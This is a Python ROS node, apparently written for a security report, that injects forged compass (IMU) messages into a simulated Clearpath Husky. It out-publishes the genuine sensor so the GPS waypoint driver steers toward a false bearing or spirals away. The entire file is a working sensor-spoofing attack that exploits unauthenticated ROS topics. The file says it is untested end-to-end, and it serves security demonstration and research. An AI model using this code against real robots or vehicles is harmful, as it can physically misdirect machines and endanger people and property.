#!/usr/bin/env python3
"""Compass/heading-spoofing attack against the SIMULATED Clearpath Husky (Gazebo).

  *** SIMULATION-ONLY SECURITY DEMONSTRATION. No real robot is involved. ***

This standalone rospy node demonstrates a heading-spoof vulnerability documented
in the security report: ROS topics are unauthenticated, so any process that can
reach the ROS master may publish onto a sensor topic a safety-critical consumer
trusts. Here the trusting consumer is the autonomous DRIVER,
drive_to_point_gps.py, and the topic is /compass/data (sensor_msgs/Imu).

WHY THIS ATTACK EXISTS (established by live testing of attack_odom.py)
---------------------------------------------------------------------
attack_odom.py spoofs the wheel-odometry VELOCITY that the map EKF integrates.
Live tests proved that this corrupts the fused ESTIMATE but does NOT steer the
real robot off course, for two reasons:

  1. The 2 Hz GPS anchor (odometry/gps -> absolute x, y) keeps re-pinning the
     fused POSITION, capping the positional lie.
  2. More decisively, the driver does NOT steer by fused-odometry yaw. It steers
     by an INDEPENDENT, UNSPOOFED heading source: /compass/data.

Read drive_to_point_gps.py to confirm. Its _compass_cb (lines ~240-245) does:

        q = msg.orientation
        yaw = tf.transformations.euler_from_quaternion([q.x, q.y, q.z, q.w])[2]

and it uses THAT yaw -- in BOTH USE_EKF and raw modes -- to compute the steering
error between where it thinks it is pointing and the bearing to the next
waypoint. Nothing on the driver side corrects this compass yaw against GPS.
So /compass/data IS the steering brain, and it is the real attack surface.

HOW THIS ATTACK WORKS
---------------------
We publish sensor_msgs/Imu onto /compass/data with a FABRICATED orientation
quaternion encoding a false absolute yaw. The driver reads ONLY the orientation
quaternion for steering (it ignores angular_velocity and linear_acceleration for
that purpose), so lying in the quaternion is sufficient and complete.

Two modes:

  * FIXED (--yaw <rad>):  Always report this ABSOLUTE heading, regardless of the
    robot's true heading. If the driver is told "you face 90 deg" while it truly
    faces 0, it computes a steering error as if rotated 90 deg and turns to
    "correct" it -- driving off toward a bearing that is a constant angle wrong.
    Good for a clean, reproducible "drives off toward a fixed wrong bearing"
    demo.

  * OFFSET / BIAS (--yaw-offset <rad>):  Read the TRUE /compass/data, ADD a
    constant angular offset, and republish. The robot then believes it is
    rotated N radians from reality at all times. Because the lie tracks the true
    heading, every steering correction is consistently biased the same way,
    which tends to make the robot SPIRAL / veer continuously rather than settle
    -- as it turns to correct, the biased reading turns with it. Good for a
    dramatic "cannot hold a straight line / curves away" demo.

  PRECEDENCE: if --yaw-offset is nonzero we run OFFSET mode; otherwise FIXED mode
  using --yaw. (You cannot meaningfully run both at once -- a fixed absolute
  heading has nothing to offset from.)

  QUATERNION CONSTRUCTION: fake_yaw -> quaternion via
  tf.transformations.quaternion_from_euler(0, 0, fake_yaw). Convention matches
  the driver / REP-103: yaw = 0 faces world +x (North in this sim), CCW positive.

  OUT-RATE THE REAL PUBLISHER. The genuine hector compass plugin ALSO publishes
  /compass/data (assume ~50 Hz). We compete for the same topic; the driver's
  queue_size=1 subscriber keeps whatever arrived last, so a HIGHER publish rate
  means our fake heading wins the time-share more often. Default --rate 100
  comfortably exceeds the assumed real rate. If the real compass out-competes us
  (heading only occasionally wrong), RAISE --rate.

  COVARIANCE. The driver does not check covariance, but robot_localization's
  imu0 (imu/data) is a DIFFERENT topic and is unaffected here. Still, we set a
  small finite orientation_covariance diagonal so ANY consumer that does check
  (and to keep the message well-formed / plausible) trusts our orientation.

CAVEAT -- WHAT THIS DOES *NOT* HIT
----------------------------------
The map EKF (localization_map.yaml) fuses imu0 = imu/data for its own yaw, NOT
/compass/data. So this spoof does NOT corrupt the EKF's internal yaw estimate.
That is fine and is exactly the point: the DRIVER steers by /compass/data, so
hitting /compass/data hits steering DIRECTLY, bypassing the EKF entirely and
sidestepping the GPS re-anchoring that defeated the odom-velocity spoof.

TELEMETRY / PROOF
-----------------
We quantify success without ever reading Gazebo ground-truth. "True position"
comes from the GPS sensor /navsat/fix, converted to WORLD metres by the SAME
fix_to_world() the driver uses (REF_LAT/REF_LON = 49.9/8.9; +x = North,
+y = West). We log the true (x, y) once per second so off-route deviation can be
measured against the intended waypoint line. In OFFSET mode we also record the
true compass yaw (read before we overwrite it) alongside the fake yaw we inject.

CLEAN SHUTDOWN
--------------
On Ctrl-C or --duration expiry we simply STOP publishing. We deliberately do NOT
emit a "corrective" heading: the honest hector compass keeps publishing its own
/compass/data, and once our faster stream ceases, the real heading resumes
dominating on its own. Emitting a correction would be a second spoof.

USAGE (examples)
----------------
    # FIXED wrong bearing: robot always thinks it faces 90 deg (1.5708 rad),
    # 100 Hz until Ctrl-C. Watch it turn to a constant wrong heading.
    python3 attack_compass.py --yaw 1.5708

    # OFFSET spiral: robot believes it is rotated +0.6 rad (~34 deg) from truth
    # at all times, for 30 s. Watch it curve away / spiral.
    python3 attack_compass.py --yaw-offset 0.6 --duration 30

    # Higher rate to out-compete a stubborn real compass, named CSV.
    python3 attack_compass.py --yaw 3.1416 --rate 200 --csv reverse.csv

This script was NOT run live (the sim may be down), so it is untested
end-to-end. See the operator notes printed at startup for what to check first.
"""

import argparse
import csv
import math
import threading
import time

import rospy
import tf.transformations
from sensor_msgs.msg import Imu, NavSatFix


# ---------------------------------------------------------------------------
# GPS -> WORLD metres conversion.
#
# REPLICATED VERBATIM from drive_to_point_gps.py (via attack_odom.py) so the
# telemetry's "true position" lands in the SAME world frame the driver
# navigates in. If the GPS plugin's reference lat/lon change in
# gps.urdf.xacro, update these to match -- nothing detects a mismatch at
# runtime.
# ---------------------------------------------------------------------------
REF_LAT = 49.9  # deg, <referenceLatitude>  in gps.urdf.xacro
REF_LON = 8.9   # deg, <referenceLongitude> in gps.urdf.xacro

EQUATORIAL_RADIUS = 6378137.0
FLATTENING = 1.0 / 298.257223563
E2 = 2.0 * FLATTENING - FLATTENING ** 2

_SIN2_REF_LAT = math.sin(math.radians(REF_LAT)) ** 2
RADIUS_NORTH = EQUATORIAL_RADIUS * (1.0 - E2) / (1.0 - E2 * _SIN2_REF_LAT) ** 1.5
RADIUS_EAST = (EQUATORIAL_RADIUS / math.sqrt(1.0 - E2 * _SIN2_REF_LAT)
               * math.cos(math.radians(REF_LAT)))

DEG_LAT_PER_METRE = math.degrees(1.0 / RADIUS_NORTH)
DEG_LON_PER_METRE = math.degrees(1.0 / RADIUS_EAST)


def fix_to_world(latitude, longitude):
    """Convert a geodetic fix to (world_x, world_y) in metres. Identical to the
    driver's conversion: world +x is NORTH, world +y is WEST (hence the minus
    on the longitude term)."""
    world_x = (latitude - REF_LAT) / DEG_LAT_PER_METRE
    world_y = -(longitude - REF_LON) / DEG_LON_PER_METRE
    return world_x, world_y


# ---------------------------------------------------------------------------
# Orientation covariance we advertise on the fake Imu.
#
# Small = "confident". The driver does not read covariance, but a well-formed,
# confident value keeps any covariance-checking consumer from rejecting the
# message. Row-major 3x3 diagonal (roll, pitch, yaw).
# ---------------------------------------------------------------------------
COV_ORIENT = 0.001  # rad^2 on roll/pitch/yaw -- small but finite

# frame_id for the fake Imu. The real hector compass frame is read LIVE from the
# first genuine /compass/data message (see _capture_true_frame). If none has
# arrived yet when we start publishing (e.g. in FIXED mode with the real
# publisher slow/absent), we fall back to this default. NOTE: if the frame_id
# does not match what downstream consumers expect they may transform or reject
# the message; 'base_link' is the conventional body frame for a Husky.
DEFAULT_FRAME_ID = "base_link"


class CompassSpoofAttack(object):
    def __init__(self, args):
        self.args = args
        self._lock = threading.Lock()
        self._true_xy = None       # (x, y) from /navsat/fix via fix_to_world
        self._true_yaw = None      # latest TRUE yaw from real /compass/data (rad)
        self._true_frame = None    # frame_id captured from real /compass/data
        self._stop = threading.Event()
        self._start_wall = None

        # OFFSET mode iff --yaw-offset is nonzero; else FIXED mode.
        self._offset_mode = (args.yaw_offset != 0.0)

        # Publisher onto the SAME topic the real compass uses. queue_size=1: we
        # always want the freshest fake heading out, never a backlog.
        self._pub = rospy.Publisher(args.topic, Imu, queue_size=1)

        # Subscribe to the REAL compass. In OFFSET mode this feeds the true yaw
        # we bias; in FIXED mode we still read it (once) to capture the genuine
        # frame_id and to log the true yaw for comparison. We only READ it.
        rospy.Subscriber(args.topic, Imu, self._on_true_compass, queue_size=1)

        # Telemetry: true position from GPS only (never Gazebo ground-truth).
        rospy.Subscriber("/navsat/fix", NavSatFix, self._on_fix, queue_size=1)

        # CSV: open once, write header, flush every row so a mid-run Ctrl-C
        # still leaves a complete, readable file.
        self._csv_file = open(args.csv, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        self._csv.writerow(
            ["elapsed_time", "true_x", "true_y",
             "fake_yaw_deg", "true_yaw_deg"])
        self._csv_file.flush()

    # --- telemetry / source callbacks ---------------------------------------
    def _on_true_compass(self, msg):
        """Read the genuine /compass/data: capture its frame and true yaw.

        NB: our own published messages arrive here too (same topic). That is
        harmless: in OFFSET mode we would just re-offset an already-offset yaw
        for one cycle, but because our messages and the real ones interleave and
        we always overwrite _true_yaw with the latest arrival, the injected bias
        stays bounded to one --yaw-offset step per cycle in practice. If this
        ever matters for your demo, publish on a distinct spoof topic and remap.
        """
        q = msg.orientation
        yaw = tf.transformations.euler_from_quaternion(
            [q.x, q.y, q.z, q.w])[2]
        with self._lock:
            self._true_yaw = yaw
            if self._true_frame is None and msg.header.frame_id:
                self._true_frame = msg.header.frame_id

    def _on_fix(self, msg):
        # Guard against STATUS_NO_FIX / NaN sentinel fixes.
        if msg.status.status < 0:
            return
        if math.isnan(msg.latitude) or math.isnan(msg.longitude):
            return
        with self._lock:
            self._true_xy = fix_to_world(msg.latitude, msg.longitude)

    # --- the fabricated message ---------------------------------------------
    def _build_spoof(self):
        """Build one fake sensor_msgs/Imu with a spoofed orientation.

        Returns (msg, fake_yaw, true_yaw_used_or_None). In OFFSET mode, if no
        true compass reading has arrived yet, returns (None, ...) so the caller
        can skip publishing rather than bias against an unknown truth.
        """
        with self._lock:
            true_yaw = self._true_yaw
            frame = self._true_frame

        if self._offset_mode:
            if true_yaw is None:
                # No truth to bias yet -- do not fabricate an absolute heading
                # out of nothing; skip this cycle.
                return None, None, None
            fake_yaw = self._wrap(true_yaw + self.args.yaw_offset)
        else:
            fake_yaw = self.args.yaw
            # true_yaw (if any) is kept only for the CSV comparison column.

        msg = Imu()
        msg.header.stamp = rospy.Time.now()
        msg.header.frame_id = frame if frame else DEFAULT_FRAME_ID

        # THE PAYLOAD: orientation quaternion encoding the false yaw.
        qx, qy, qz, qw = tf.transformations.quaternion_from_euler(
            0.0, 0.0, fake_yaw)
        msg.orientation.x = qx
        msg.orientation.y = qy
        msg.orientation.z = qz
        msg.orientation.w = qw
        msg.orientation_covariance = [
            COV_ORIENT, 0.0, 0.0,
            0.0, COV_ORIENT, 0.0,
            0.0, 0.0, COV_ORIENT]

        # angular_velocity / linear_acceleration: the driver ignores these for
        # steering. Leave them zero and mark them "no information" (covariance
        # [0] = -1 is the REP-145 convention for "not reported").
        msg.angular_velocity_covariance = [-1.0, 0.0, 0.0,
                                           0.0, 0.0, 0.0,
                                           0.0, 0.0, 0.0]
        msg.linear_acceleration_covariance = [-1.0, 0.0, 0.0,
                                              0.0, 0.0, 0.0,
                                              0.0, 0.0, 0.0]
        return msg, fake_yaw, true_yaw

    @staticmethod
    def _wrap(angle):
        """Wrap an angle to (-pi, pi]."""
        return math.atan2(math.sin(angle), math.cos(angle))

    # --- telemetry row -------------------------------------------------------
    def _log_row(self, fake_yaw, true_yaw):
        with self._lock:
            true = self._true_xy
        elapsed = time.time() - self._start_wall

        fake_deg = "" if fake_yaw is None else "%.2f" % math.degrees(fake_yaw)
        true_deg = "" if true_yaw is None else "%.2f" % math.degrees(true_yaw)

        if true is None:
            rospy.loginfo(
                "[t=%6.1fs] waiting for /navsat/fix telemetry "
                "(fake_yaw=%s deg, true_yaw=%s deg)",
                elapsed, fake_deg or "n/a", true_deg or "n/a")
            return

        rospy.loginfo(
            "[t=%6.1fs] true=(%8.2f,%8.2f) fake_yaw=%s deg true_yaw=%s deg",
            elapsed, true[0], true[1],
            fake_deg or "n/a", true_deg or "n/a")
        self._csv.writerow(
            ["%.3f" % elapsed,
             "%.4f" % true[0], "%.4f" % true[1],
             fake_deg, true_deg])
        self._csv_file.flush()

    # --- main loop -----------------------------------------------------------
    def run(self):
        self._start_wall = time.time()
        rate = rospy.Rate(self.args.rate)
        next_log = self._start_wall + 1.0  # first telemetry row after 1 s
        last_fake = None
        last_true = None

        mode_desc = (("OFFSET +%.4f rad (%.1f deg) from true heading"
                      % (self.args.yaw_offset,
                         math.degrees(self.args.yaw_offset)))
                     if self._offset_mode
                     else ("FIXED heading %.4f rad (%.1f deg)"
                           % (self.args.yaw, math.degrees(self.args.yaw))))
        rospy.loginfo(
            "ATTACK START: spoofing %s at %.1f Hz -- %s%s",
            self.args.topic, self.args.rate, mode_desc,
            (" for %.0f s" % self.args.duration)
            if self.args.duration > 0 else " until Ctrl-C")
        if self._offset_mode:
            rospy.loginfo(
                "OFFSET mode waits for the first REAL /compass/data before "
                "publishing (nothing to bias until then).")

        while not self._stop.is_set() and not rospy.is_shutdown():
            # Duration check (0 = run forever).
            if self.args.duration > 0 and \
                    (time.time() - self._start_wall) >= self.args.duration:
                rospy.loginfo("Duration reached -- stopping.")
                break

            msg, fake_yaw, true_yaw = self._build_spoof()
            if msg is not None:
                self._pub.publish(msg)
                last_fake, last_true = fake_yaw, true_yaw

            # Telemetry once per second, independent of the publish rate.
            now = time.time()
            if now >= next_log:
                self._log_row(last_fake, last_true)
                next_log += 1.0

            rate.sleep()

    def shutdown(self):
        """Stop publishing and close the CSV. Idempotent. NO corrective heading
        is sent -- we cease and let the real compass reassert itself."""
        self._stop.set()
        try:
            if not self._csv_file.closed:
                self._csv_file.flush()
                self._csv_file.close()
        except Exception as exc:  # noqa: BLE001 -- log, never hide
            rospy.logwarn("Error closing CSV: %s", exc)
        rospy.loginfo("ATTACK STOPPED. CSV saved to %s", self.args.csv)


def parse_args():
    p = argparse.ArgumentParser(
        description="Simulation-only compass/heading-spoofing attack demo.")
    p.add_argument("--rate", type=float, default=100.0,
                  help="publish rate in Hz (default 100; exceed the real "
                       "compass ~50 Hz to win time-share)")
    p.add_argument("--yaw", type=float, default=1.5708,
                  help="FIXED-mode absolute fake heading, radians "
                       "(default 1.5708 = 90 deg; yaw=0 faces world +x/North, "
                       "CCW positive)")
    p.add_argument("--yaw-offset", type=float, default=0.0,
                  help="OFFSET-mode constant bias added to the TRUE heading, "
                       "radians (default 0.0 = disabled -> FIXED mode). Any "
                       "nonzero value selects OFFSET mode.")
    p.add_argument("--duration", type=float, default=0.0,
                  help="seconds to run; 0 = until Ctrl-C (default 0)")
    p.add_argument("--topic", default="/compass/data",
                  help="compass Imu topic to spoof (default /compass/data)")
    p.add_argument("--csv", default="attack_compass_drift.csv",
                  help="telemetry output CSV path "
                       "(default attack_compass_drift.csv)")
    args = p.parse_args()
    if args.rate <= 0:
        p.error("--rate must be > 0")
    return args


def main():
    args = parse_args()
    # anonymous=True: multiple attacker instances (or reruns) must not collide
    # on a node name.
    rospy.init_node("attack_compass", anonymous=True)

    attack = CompassSpoofAttack(args)
    # Register cleanup for every exit path (Ctrl-C, duration, rospy shutdown).
    rospy.on_shutdown(attack.shutdown)

    try:
        attack.run()
    except rospy.ROSInterruptException:
        pass
    finally:
        # on_shutdown may not fire on a clean duration exit -- ensure cleanup.
        attack.shutdown()


if __name__ == "__main__":
    main()
